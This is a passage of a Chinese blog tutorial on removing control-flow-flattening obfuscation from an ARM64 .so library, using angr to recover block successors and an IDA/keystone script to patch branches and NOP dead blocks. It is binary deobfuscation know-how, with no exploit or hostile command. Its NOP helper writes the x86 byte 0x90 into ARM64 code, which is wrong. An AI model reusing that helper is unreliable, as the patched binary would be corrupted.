class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_block_succ</span>(<span class="hljs-params">proj, base, func_offset, state, real_block_addr, real_blocks, path</span>):<br>    msm = proj.factory.simgr(state)  <span class="hljs-comment"># 构造模拟器</span><br><br>    <span class="hljs-comment"># 找到传入的真实块作为主块,再复制一份当前 state ,准备后继块获取的操作</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(msm.active):<br>        <span class="hljs-keyword">for</span> active_state <span class="hljs-keyword">in</span> msm.active:<br>            offset = active_state.addr - base<br>            <span class="hljs-keyword">if</span> offset == real_block_addr:  <span class="hljs-comment"># 找到真实块</span><br>                mstate = active_state.copy()  <span class="hljs-comment"># 复制state,为后继块的获取做准备</span><br>                msm2 = proj.factory.simgr(mstate)<br>                msm2.step(num_inst=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 让状态进到块内的下一条指令位置，避免和外层状态混淆</span><br><br>                <span class="hljs-comment"># 寻找真实块的所有后继块</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(msm2.active):<br>                    <span class="hljs-keyword">for</span> mactive_state <span class="hljs-keyword">in</span> msm2.active:<br>                        ins_offset = mactive_state.addr - base<br>                        <span class="hljs-keyword">if</span> ins_offset <span class="hljs-keyword">in</span> real_blocks:  <span class="hljs-comment"># 无分支块（或无条件跳转）</span><br>                            <span class="hljs-comment"># 在无条件跳转中,并且有至少两条路径同时执行到真实块时,取非 ret 块的真实块</span><br>                            msm2_len = <span class="hljs-built_in">len</span>(msm2.active)<br>                            <span class="hljs-keyword">if</span> msm2_len &gt; <span class="hljs-number">1</span>:<br>                                tmp_addrs = []<br>                                <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> msm2.active:<br>                                    moffset = s.addr - base<br>                                    tmp_value = path[real_block_addr]<br>                                    <span class="hljs-keyword">if</span> moffset <span class="hljs-keyword">in</span> real_blocks <span class="hljs-keyword">and</span> moffset <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> tmp_value:<br>                                        tmp_addrs.append(moffset)<br>                                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp_addrs) &gt; <span class="hljs-number">1</span>:<br>                                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前至少有两个路径同时执行到真实块:&quot;</span>, [<span class="hljs-built_in">hex</span>(tmp_addr) <span class="hljs-keyword">for</span> tmp_addr <span class="hljs-keyword">in</span> tmp_addrs])<br>                                    ret_addr = real_blocks[<span class="hljs-built_in">len</span>(real_blocks) - <span class="hljs-number">1</span>]<br>                                    <span class="hljs-keyword">if</span> ret_addr <span class="hljs-keyword">in</span> tmp_addrs:<br>                                        tmp_addrs.remove(ret_addr)<br>                                    ins_offset = tmp_addrs[<span class="hljs-number">0</span>]<br>                                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;两个路径同时执行到真实块最后取得:&quot;</span>, <span class="hljs-built_in">hex</span>(ins_offset))<br><br>                            value = path[real_block_addr]<br>                            <span class="hljs-keyword">if</span> ins_offset <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> value:<br>                                value.append(ins_offset)<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;无条件跳转块关系:<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(real_block_addr)&#125;</span>--&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ins_offset)&#125;</span>&quot;</span>)<br>                            <span class="hljs-keyword">return</span><br><br>                        <span class="hljs-comment">#  csel 分支块</span><br>                        ins = mactive_state.block().capstone.insns[<span class="hljs-number">0</span>]<br>                        <span class="hljs-keyword">if</span> ins.mnemonic == <span class="hljs-string">&#x27;csel&#x27;</span>:<br>                            state_true = mactive_state.copy()<br>                            state_true_succ_addr = find_state_succ(proj, base, state_true, <span class="hljs-literal">True</span>, real_blocks, real_block_addr, path)<br><br>                            state_false = mactive_state.copy()<br>                            state_false_succ_addr = find_state_succ(proj, base, state_false, <span class="hljs-literal">False</span>, real_blocks, real_block_addr, path)<br><br>                            <span class="hljs-keyword">if</span> state_true_succ_addr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> state_false_succ_addr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;csel错误指令地址:&quot;</span>, <span class="hljs-built_in">hex</span>(ins_offset))<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;csel后继有误:<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(real_block_addr)&#125;</span>--&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(state_true_succ_addr) <span class="hljs-keyword">if</span> state_true_succ_addr <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> state_true_succ_addr&#125;</span>,&quot;</span><br>                                      <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(state_false_succ_addr) <span class="hljs-keyword">if</span> state_false_succ_addr <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> state_false_succ_addr&#125;</span>&quot;</span>)<br>                                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;erro&quot;</span><br><br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;csel分支跳转块关系:<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(real_block_addr)&#125;</span>--&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(state_true_succ_addr)&#125;</span>,<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(state_false_succ_addr)&#125;</span>&quot;</span>)<br>                            <span class="hljs-keyword">return</span><br>                    msm2.step(num_inst=<span class="hljs-number">1</span>)<br>                <span class="hljs-comment"># 真实块集合中的最后一个基本块如果最后没找到后继,说明是return块,直接返回</span><br>                <span class="hljs-keyword">return</span><br>        msm.step(num_inst=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ul><li>主流程<br>初始化 angr</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">proj = angr.Project(file_path, auto_load_libs=<span class="hljs-literal">False</span>)  <span class="hljs-comment"># 加载目标 so 文件</span><br>base = proj.loader.min_addr <span class="hljs-comment"># 获取基地址</span><br>func_addr = base + func_offset <span class="hljs-comment"># 计算函数实际地址</span><br>init_state = proj.factory.blank_state(addr=func_addr) <span class="hljs-comment"># 创建初始执行状态</span><br>init_state.options.add(angr.options.CALLLESS) <span class="hljs-comment"># 关闭函数调用模拟（不进入库函数），避免模拟到 libc 出问题</span><br></code></pre></td></tr></table></figure><p>构造 path 字典，key 是每个真实块地址，value 是该块的后继真实块列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">path = &#123;addr: [] <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> real_blocks&#125;<br>ret_addr = real_blocks[<span class="hljs-built_in">len</span>(real_blocks) - <span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p>取主序言的最后一条指令,后面要在这个位置 hook 来修改 PC 跳转，直接跳到某个真实块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">first_block = proj.factory.block(func_addr)<br>first_block_insns = first_block.capstone.insns<br>first_block_last_ins = first_block_insns[<span class="hljs-built_in">len</span>(first_block_insns) - <span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p>遍历真实块地址，检查是否属于某个子序言块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> real_block_addr <span class="hljs-keyword">in</span> tqdm(real_blocks):<br>        <span class="hljs-keyword">if</span> ret_addr == real_block_addr:<br>            <span class="hljs-keyword">continue</span><br>        <br>        prologue_block_addr = <span class="hljs-number">0</span><br>        child_prologue_last_ins_ea = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(all_child_prologue_addr) &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">for</span> index, child_prologue_array <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(all_child_prologue_addr):<br>                <span class="hljs-keyword">if</span> real_block_addr <span class="hljs-keyword">in</span> child_prologue_array:<br>                    prologue_block_addr = child_prologue_array[<span class="hljs-number">0</span>] + base<br>                    child_prologue_last_ins_ea = all_child_prologue_last_ins_ea[index]<br></code></pre></td></tr></table></figure><p>hook 函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">jump_to_address</span>(<span class="hljs-params">state</span>):<br>    state.regs.pc = base + real_block_addr - <span class="hljs-number">4</span> <span class="hljs-comment"># ARM 架构指令长度 4</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jump_to_child_prologue_address</span>(<span class="hljs-params">state</span>):<br>    state.regs.pc = prologue_block_addr - <span class="hljs-number">4</span><br><br><span class="hljs-keyword">if</span> prologue_block_addr == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment"># 没有子序言，直接在主序言最后一条指令处hook</span><br>    <span class="hljs-keyword">if</span> real_block_addr != func_offset:<br>        proj.hook(first_block_last_ins.address, jump_to_address, first_block_last_ins.size)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 先跳到子序言，再从子序言的最后一条跳到真实块</span><br>    proj.hook(first_block_last_ins.address, jump_to_child_prologue_address, first_block_last_ins.size)<br>    proj.hook(child_prologue_last_ins_ea, jump_to_address, <span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p>最后就是调用 find_block_succ 获取后继块并输出控制流关系</p><h4 id="重建控制流"><a href="#重建控制流" class="headerlink" title="重建控制流"></a>重建控制流</h4><p>关键点：<br>对于条件分支块 (在 patch_list 中有两个后继块): 查找 CSEL 指令，然后使用 keystone 汇编器生成一条条件跳转指令 (B.cond) 和一条无条件跳转指令 (B)，并用它们替换 CSEL 指令和块末尾的指令<br>对于无条件跳转块 (在 patch_list 中有一个后继块): 在该块的末尾打上一个无条件跳转 (B) 指令，使其直接跳转到正确的目标块<br>对于返回块 (在 patch_list 中没有后继块): 跳过，不进行任何修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">import</span> ida_funcs<br><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> idautils<br><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> keystone<br><br><span class="hljs-comment">#初始化Ks arm64架构的so,模式:小端序</span><br>ks = keystone.Ks(keystone.KS_ARCH_ARM64, keystone.KS_MODE_LITTLE_ENDIAN)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_ins_to_nop</span>(<span class="hljs-params">ins</span>):<br>    size = idc.get_item_size(ins)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):<br>        idc.patch_byte(ins + i,<span class="hljs-number">0x90</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_block_by_address</span>(<span class="hljs-params">ea</span>):<br>    func = idaapi.get_func(ea)<br>    blocks = idaapi.FlowChart(func)<br>    <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>        <span class="hljs-keyword">if</span> block.start_ea &lt;= ea &lt; block.end_ea:<br>            <span class="hljs-keyword">return</span> block<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_branch</span>(<span class="hljs-params">patch_list</span>):<br><br>    <span class="hljs-keyword">for</span> ea <span class="hljs-keyword">in</span> patch_list:<br>        values = patch_list[ea]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(values) == <span class="hljs-number">0</span>:<span class="hljs-comment">#如果后继块为0,基本都是return块,不需要patch,直接跳过</span><br>            <span class="hljs-keyword">continue</span><br>        block = get_block_by_address(<span class="hljs-built_in">int</span>(ea, <span class="hljs-number">16</span>))<br>        start_ea = block.start_ea<br>        end_ea = block.end_ea<br>        last_ins_ea = idc.prev_head(end_ea)<span class="hljs-comment">#因为block.end_ea获取的地址是块最后一个地址的下一个地址,所以需要向上取一个地址</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(values) == <span class="hljs-number">2</span>:<span class="hljs-comment">#分支块的patch</span><br>            flag = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">for</span> ins <span class="hljs-keyword">in</span> idautils.Heads(start_ea,end_ea):<span class="hljs-comment">#获取指定范围内的所有指令</span><br>                  <span class="hljs-keyword">if</span> idc.print_insn_mnem(ins) == <span class="hljs-string">&quot;CSEL&quot;</span>:<br>                      condition = idc.print_operand(ins,<span class="hljs-number">3</span>)<br>                      encoding, count = ks.asm(<span class="hljs-string">f&#x27;B.<span class="hljs-subst">&#123;condition&#125;</span> <span class="hljs-subst">&#123;values[<span class="hljs-number">0</span>]&#125;</span>&#x27;</span>,ins)<span class="hljs-comment">#生成CSEL指令处patch的汇编</span><br>                      encoding2, count2 = ks.asm(<span class="hljs-string">f&#x27;B <span class="hljs-subst">&#123;values[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span>, last_ins_ea)<span class="hljs-comment">#生成块最后一个地址指令处patch的汇编</span><br>                      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                          idc.patch_byte(ins+ i, encoding[i])<br>                      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                          idc.patch_byte(last_ins_ea + i, encoding2[i])<br>                      flag = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> flag:<span class="hljs-comment">#如果在有分支跳转的情况下没有找到CSEL指令,就要在当前基本块的最后两条指令做处理。此基本块的下一条指令就是csel</span><br>                ins = idc.prev_head(last_ins_ea)<br>                succs = block.succs()<br>                succs_list = <span class="hljs-built_in">list</span>(succs)<br>                csel_ea = succs_list[<span class="hljs-number">0</span>].start_ea<br>                condition = idc.print_operand(csel_ea, <span class="hljs-number">3</span>)<span class="hljs-comment">#获取csel指令的条件判断</span><br>                encoding, count = ks.asm(<span class="hljs-string">f&#x27;B.<span class="hljs-subst">&#123;condition&#125;</span> <span class="hljs-subst">&#123;values[<span class="hljs-number">0</span>]&#125;</span>&#x27;</span>, ins)  <span class="hljs-comment"># 生成CSEL指令处patch的汇编</span><br>                encoding2, count2 = ks.asm(<span class="hljs-string">f&#x27;B <span class="hljs-subst">&#123;values[<span class="hljs-number">1</span>]&#125;</span>&#x27;</span>, last_ins_ea)  <span class="hljs-comment"># 生成块最后一个地址指令处patch的汇编</span><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                        idc.patch_byte(ins + i, encoding[i])<br>                    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                        idc.patch_byte(last_ins_ea + i, encoding2[i])<br>                <span class="hljs-keyword">except</span> :<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;except&quot;</span>)<br><br>        <span class="hljs-keyword">else</span>:<span class="hljs-comment">#无分支块的patch</span><br>            encoding, count = ks.asm(<span class="hljs-string">f&#x27;B <span class="hljs-subst">&#123;values[<span class="hljs-number">0</span>]&#125;</span>&#x27;</span>, last_ins_ea)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                idc.patch_byte(last_ins_ea + i, encoding[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pach over!!!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_all_useless_block</span>(<span class="hljs-params">func_ea,real_blocks</span>):<br>    blocks = idaapi.FlowChart(idaapi.get_func(func_ea))<br>    local_real_blocks = real_blocks.copy()<br>    useless_blocks = []<br>    ret_block_addr = local_real_blocks[<span class="hljs-built_in">len</span>(local_real_blocks)-<span class="hljs-number">1</span>]<br>    queue = deque()<br>    ret_block = get_block_by_address(ret_block_addr)<br>    queue.append(ret_block)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(queue) &gt; <span class="hljs-number">0</span>:<span class="hljs-comment">#处理ret块相关的后继块</span><br>        cur_block= queue.popleft()<br>        queue.extend(succ <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> cur_block.succs())<br>        ret_flag = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> succ <span class="hljs-keyword">in</span> cur_block.succs():<br>            local_real_blocks.append(succ.start_ea)<br>            end_ea = succ.end_ea<br>            last_ins_ea = idc.prev_head(end_ea)<br>            mnem = idc.print_insn_mnem(last_ins_ea)<br>            <span class="hljs-keyword">if</span> mnem == <span class="hljs-string">&quot;RET&quot;</span>:<br>                ret_flag = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">if</span> ret_flag:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># local_real_blocks.extend(succ.start_ea for succ in cur_block.succs())</span><br>    <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>        start_ea = block.start_ea<br>        <span class="hljs-keyword">if</span> start_ea <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> local_real_blocks:<br>            useless_blocks.append(start_ea)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;所有的无用块:&quot;</span>,[<span class="hljs-built_in">hex</span>(b)<span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> useless_blocks])<br>    <span class="hljs-keyword">return</span> useless_blocks<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_useless_blocks</span>(<span class="hljs-params">func_ea,real_blocks</span>):<br>    useless_blocks = find_all_useless_block(func_ea, real_blocks)<br>    <span class="hljs-comment"># print(useless_blocks)</span><br>    <span class="hljs-keyword">for</span> useless_block_addr <span class="hljs-keyword">in</span> useless_blocks:<br>        block = get_block_by_address(useless_block_addr)<br>        start_ea = block.start_ea<br>        end_ea = block.end_ea<br><br>        insns = idautils.Heads(start_ea, end_ea)<br>        <span class="hljs-keyword">for</span> ins <span class="hljs-keyword">in</span> insns:<br>            patch_ins_to_nop(ins)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无用块nop完成&quot;</span>)<br><br>patch_list =&#123;<span class="hljs-string">&#x27;0x41d08&#x27;</span>: [<span class="hljs-string">&#x27;0x4221c&#x27;</span>], <span class="hljs-string">&#x27;0x41da0&#x27;</span>: [<span class="hljs-string">&#x27;0x421c4&#x27;</span>, <span class="hljs-string">&#x27;0x42258&#x27;</span>], <span class="hljs-string">&#x27;0x41e14&#x27;</span>: [<span class="hljs-string">&#x27;0x41fac&#x27;</span>], <span class="hljs-string">&#x27;0x41e70&#x27;</span>: [<span class="hljs-string">&#x27;0x4213c&#x27;</span>], <span class="hljs-string">&#x27;0x41f0c&#x27;</span>: [<span class="hljs-string">&#x27;0x42a80&#x27;</span>, <span class="hljs-string">&#x27;0x4200c&#x27;</span>], <span class="hljs-string">&#x27;0x41f64&#x27;</span>: [<span class="hljs-string">&#x27;0x42ab0&#x27;</span>], <span class="hljs-string">&#x27;0x41fac&#x27;</span>: [<span class="hljs-string">&#x27;0x42a80&#x27;</span>, <span class="hljs-string">&#x27;0x421d8&#x27;</span>], <span class="hljs-string">&#x27;0x4200c&#x27;</span>: [<span class="hljs-string">&#x27;0x42a90&#x27;</span>], <span class="hljs-string">&#x27;0x42058&#x27;</span>: [<span class="hljs-string">&#x27;0x41f64&#x27;</span>, <span class="hljs-string">&#x27;0x42ab0&#x27;</span>], <span class="hljs-string">&#x27;0x420b4&#x27;</span>: [<span class="hljs-string">&#x27;0x41e70&#x27;</span>, <span class="hljs-string">&#x27;0x42208&#x27;</span>], <span class="hljs-string">&#x27;0x420fc&#x27;</span>: [<span class="hljs-string">&#x27;0x42ab0&#x27;</span>, <span class="hljs-string">&#x27;0x421f0&#x27;</span>], <span class="hljs-string">&#x27;0x4212c&#x27;</span>: [<span class="hljs-string">&#x27;0x42a68&#x27;</span>], <span class="hljs-string">&#x27;0x4213c&#x27;</span>: [<span class="hljs-string">&#x27;0x4212c&#x27;</span>, <span class="hljs-string">&#x27;0x42ab0&#x27;</span>], <span class="hljs-string">&#x27;0x42154&#x27;</span>: [<span class="hljs-string">&#x27;0x420b4&#x27;</span>], <span class="hljs-string">&#x27;0x421b0&#x27;</span>: [<span class="hljs-string">&#x27;0x41fac&#x27;</span>], <span class="hljs-string">&#x27;0x421c4&#x27;</span>: [<span class="hljs-string">&#x27;0x41f0c&#x27;</span>], <span class="hljs-string">&#x27;0x421d8&#x27;</span>: [<span class="hljs-string">&#x27;0x42258&#x27;</span>, <span class="hljs-string">&#x27;0x42ab0&#x27;</span>], <span class="hljs-string">&#x27;0x421f0&#x27;</span>: [<span class="hljs-string">&#x27;0x42ab0&#x27;</span>, <span class="hljs-string">&#x27;0x4223c&#x27;</span>], <span class="hljs-string">&#x27;0x42208&#x27;</span>: [<span class="hljs-string">&#x27;0x4213c&#x27;</span>], <span class="hljs-string">&#x27;0x4221c&#x27;</span>: [<span class="hljs-string">&#x27;0x42154&#x27;</span>, <span class="hljs-string">&#x27;0x4212c&#x27;</span>], <span class="hljs-string">&#x27;0x4223c&#x27;</span>: [<span class="hljs-string">&#x27;0x41da0&#x27;</span>], <span class="hljs-string">&#x27;0x42a48&#x27;</span>: [<span class="hljs-string">&#x27;0x42058&#x27;</span>], <span class="hljs-string">&#x27;0x42a68&#x27;</span>: [<span class="hljs-string">&#x27;0x420fc&#x27;</span>, <span class="hljs-string">&#x27;0x42ab0&#x27;</span>], <span class="hljs-string">&#x27;0x42a80&#x27;</span>: [<span class="hljs-string">&#x27;0x421d8&#x27;</span>], <span class="hljs-string">&#x27;0x42a90&#x27;</span>: [<span class="hljs-string">&#x27;0x421b0&#x27;</span>, <span class="hljs-string">&#x27;0x41e14&#x27;</span>], <span class="hljs-string">&#x27;0x42258&#x27;</span>: [<span class="hljs-string">&#x27;0x42a1c&#x27;</span>], <span class="hljs-string">&#x27;0x422f8&#x27;</span>: [<span class="hljs-string">&#x27;0x42a48&#x27;</span>], <span class="hljs-string">&#x27;0x42368&#x27;</span>: [<span class="hljs-string">&#x27;0x4266c&#x27;</span>], <span class="hljs-string">&#x27;0x423dc&#x27;</span>: [<span class="hljs-string">&#x27;0x42368&#x27;</span>], <span class="hljs-string">&#x27;0x42454&#x27;</span>: [<span class="hljs-string">&#x27;0x429d8&#x27;</span>, <span class="hljs-string">&#x27;0x426c8&#x27;</span>], <span class="hljs-string">&#x27;0x424b0&#x27;</span>: [<span class="hljs-string">&#x27;0x42570&#x27;</span>, <span class="hljs-string">&#x27;0x42860&#x27;</span>], <span class="hljs-string">&#x27;0x42518&#x27;</span>: [<span class="hljs-string">&#x27;0x42454&#x27;</span>], <span class="hljs-string">&#x27;0x42570&#x27;</span>: [<span class="hljs-string">&#x27;0x42a04&#x27;</span>], <span class="hljs-string">&#x27;0x425b8&#x27;</span>: [<span class="hljs-string">&#x27;0x428e4&#x27;</span>], <span class="hljs-string">&#x27;0x4262c&#x27;</span>: [<span class="hljs-string">&#x27;0x429d8&#x27;</span>], <span class="hljs-string">&#x27;0x4266c&#x27;</span>: [<span class="hljs-string">&#x27;0x42930&#x27;</span>, <span class="hljs-string">&#x27;0x428a8&#x27;</span>], <span class="hljs-string">&#x27;0x426c8&#x27;</span>: [<span class="hljs-string">&#x27;0x42a2c&#x27;</span>], <span class="hljs-string">&#x27;0x42718&#x27;</span>: [<span class="hljs-string">&#x27;0x428c0&#x27;</span>], <span class="hljs-string">&#x27;0x42794&#x27;</span>: [<span class="hljs-string">&#x27;0x428a8&#x27;</span>, <span class="hljs-string">&#x27;0x42718&#x27;</span>], <span class="hljs-string">&#x27;0x427d8&#x27;</span>: [<span class="hljs-string">&#x27;0x42918&#x27;</span>, <span class="hljs-string">&#x27;0x422f8&#x27;</span>], <span class="hljs-string">&#x27;0x42808&#x27;</span>: [<span class="hljs-string">&#x27;0x427d8&#x27;</span>, <span class="hljs-string">&#x27;0x423dc&#x27;</span>], <span class="hljs-string">&#x27;0x42860&#x27;</span>: [<span class="hljs-string">&#x27;0x42870&#x27;</span>], <span class="hljs-string">&#x27;0x42870&#x27;</span>: [<span class="hljs-string">&#x27;0x42808&#x27;</span>, <span class="hljs-string">&#x27;0x42a48&#x27;</span>], <span class="hljs-string">&#x27;0x428a8&#x27;</span>: [<span 